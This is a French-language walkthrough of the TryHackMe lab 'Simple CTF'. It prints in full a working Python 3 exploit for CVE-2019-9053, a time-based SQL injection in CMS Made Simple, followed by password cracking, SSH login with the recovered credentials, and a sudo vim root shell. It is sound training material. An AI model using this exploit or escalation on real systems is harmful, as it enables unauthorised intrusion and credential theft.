# 🧬 Simple CTF — Walkthrough

🔗 **Room TryHackMe :** [Simple CTF](https://tryhackme.com/room/easyctf)

```diff
> enumérer large • casser le secret du CMS • sudo vim devient root
```

---

## ℹ️ Informations

- **Plateforme :** TryHackMe
- **Difficulté :** débutant
- **Objectif :** récupérer les identifiants web, obtenir un shell SSH, lire `user.txt`, escalader en `root`, puis lire `root.txt`
- **Services exposés :** FTP, HTTP et SSH sur le port `2222`

---

## 🧠 Reconnaissance

### Scan des ports

On commence par scanner la cible :

```bash
nmap -p 1-1000 simplectf.thm -sV -T5
```

Premier résultat :

```text
21/tcp open  ftp   vsftpd 3.0.3
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

![Scan initial des ports](screenshots/1-HowManyServicesPort1000.png)

Un scan plus complet révèle le service SSH sur un port non standard :

```text
2222/tcp open  ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

👉 **Insight :**
Le premier scan répond à la question des ports sous `1000`, mais l'accès réel demande une énumération plus large. SSH écoute sur `2222`, pas sur `22`.

---

## 🌐 Enumération web

### Découverte de répertoires

Le serveur web affiche une page Apache par défaut. La prochaine étape est donc la découverte de répertoires :

```bash
dirsearch -u http://simplectf.thm/
```

Résultats intéressants :

```text
/robots.txt
/simple  ->  http://simplectf.thm/simple/
```

![Découverte de l'application web](screenshots/5-WAPP.png)

Le chemin `/simple` mène à CMS Made Simple.

👉 **Insight :**
Une page Apache par défaut est souvent seulement le hall d'entrée. L'énumération de répertoires révèle l'application réelle.

---

## 🧪 Exploitation

### Injection SQL dans CMS Made Simple

CMS Made Simple jusqu'à la version `2.2.9` est vulnérable à une injection SQL non authentifiée via CVE-2019-9053. L'exploit public est disponible sur Exploit-DB :

```text
https://www.exploit-db.com/exploits/46635
```

L'exploit original a dû être ajusté pour l'environnement Python 3 local. Voici la version compatible Python 3 utilisée pendant la résolution :

```python
#!/usr/bin/env python3
# Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# CVE-2019-9053

import requests
from termcolor import colored, cprint
import time
import optparse
import hashlib

# ---------- Options ----------
parser = optparse.OptionParser()
parser.add_option('-u', '--url',
                  action="store", dest="url",
                  help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist',
                  action="store", dest="wordlist",
                  help="Wordlist for crack admin password")
parser.add_option('-c', '--crack',
                  action="store_true", dest="cracking",
                  help="Crack password with wordlist", default=False)

options, args = parser.parse_args()

if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this SQL injection is time based.")
    exit(1)

# ---------- Globals ----------
url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
TIME = 1  # a ajuster si besoin (latence)
db_name = ""
output = ""
email = ""
salt = ''

wordlist = ""
if options.wordlist:
    wordlist = options.wordlist

# ---------- Helpers ----------
def crack_password():
    global password, output, wordlist, salt
    if not wordlist:
        output += "\n[!] No wordlist provided, cannot crack password."
        return

    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                beautify_print_try(line)
                # md5 en Python 3 attend des bytes
                if hashlib.md5((salt + line).encode()).hexdigest() == password:
                    output += "\n[+] Password cracked: " + line
                    break
    except FileNotFoundError:
        output += "\n[!] Wordlist file not found: " + wordlist

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_salt = salt + ch
            ord_salt_temp = ord_salt + format(ord(ch), 'x')
            beautify_print_try(temp_salt)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_siteprefs+where+sitepref_value+like+0x" +
                ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp

    flag = True
    output.append if isinstance(output, list) else None
    output_str = '\n[+] Salt for password found: ' + salt
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag, password, output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_password = password + ch
            ord_password_temp = ord_password + format(ord(ch), 'x')
            beautify_print_try(temp_password)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+password+like+0x" +
                ord_password_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            password = temp_password
            ord_password = ord_password_temp

    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag, db_name, output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_db_name = db_name + ch
            ord_db_name_temp = ord_db_name + format(ord(ch), 'x')
            beautify_print_try(temp_db_name)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+username+like+0x" +
                ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp

    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag, email, output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_email = email + ch
            ord_email_temp = ord_email + format(ord(ch), 'x')
            beautify_print_try(temp_email)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+email+like+0x" +
                ord_email_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            email = temp_email
            ord_email = ord_email_temp

    output += '\n[+] Email found: ' + email
    flag = True

# ---------- Main ----------
dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password", 'yellow'))
    crack_password()

beautify_print()
```

Elle est ensuite lancée contre le chemin du CMS avec une wordlist :

```bash
python3 cmsexploit.py -u http://simplectf.thm/simple -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt -c
```

Valeurs récupérées :

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

![Mot de passe récupéré](screenshots/6-Password.png)

Identifiants :

```text
mitch:secret
```

![Réponses TryHackMe](screenshots/3-RoomAnswers.png)

👉 **Insight :**
L'exploit fait deux choses : il extrait les données du compte CMS et, avec une wordlist, casse le hash salé pour obtenir un mot de passe réutilisable.

---

## 🐚 Accès initial

On utilise les identifiants récupérés pour se connecter en SSH sur le port `2222` :

```bash
ssh mitch@simplectf.thm -p 2222
```

Après authentification, on obtient un shell en tant que `mitch`.

```text
Welcome to Ubuntu 16.04.6 LTS
$ whoami
mitch
```

👉 **Insight :**
La réutilisation de mot de passe transforme une compromission CMS en accès système. Dès que des identifiants apparaissent, il faut les tester sur les services de connexion exposés.

---

## 🚩 Flag utilisateur

Le flag utilisateur se trouve dans le dossier personnel de `mitch` :

```bash
cd /home/mitch
ls -la
cat user.txt
```

Flag :

```text
G00d j0b, keep up!
```

![Progression de la room](screenshots/4-RoomAnswers.png)

---

## ⬆️ Escalade de privilèges

### Enumération sudo

On vérifie ce que `mitch` peut exécuter avec des privilèges élevés :

```bash
sudo -l
```

Résultat important :

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### Shell root

Comme `vim` peut être exécuté en root sans mot de passe, on l'utilise pour ouvrir un shell :

```bash
sudo vim -c ':!/bin/sh'
```

Puis on confirme les privilèges :

```bash
whoami
```

```text
root
```

👉 **Insight :**
`sudo -l` est court, mais très puissant. Une seule entrée d'éditeur sans mot de passe peut devenir un shell root complet quand le binaire permet l'exécution de commandes.

---

## 👑 Flag root

On localise et on lit le flag root :

```bash
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```

Flag :

```text
W3ll d0n3. You made it!
```

---

## 🧠 Conclusion

Cette room met en pratique :

- l'énumération complète des ports
- la découverte de répertoires web
- l'exploitation de CMS Made Simple
- le cassage de hash avec une wordlist
- l'accès SSH avec des identifiants réutilisés
- l'escalade de privilèges `sudo` avec GTFOBins

---

```diff
> SSH caché donne le foothold • vim sans mot de passe donne la couronne
```

## 🔗 Références

- [TryHackMe - Simple CTF](https://tryhackme.com/room/easyctf)
- [Exploit-DB - CMS Made Simple <= 2.2.9 SQL Injection](https://www.exploit-db.com/exploits/46635)
- [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [GTFOBins - Vim](https://gtfobins.github.io/gtfobins/vim/)

---

Les notes brutes de résolution sont conservées dans [Notes.md](Notes.md).
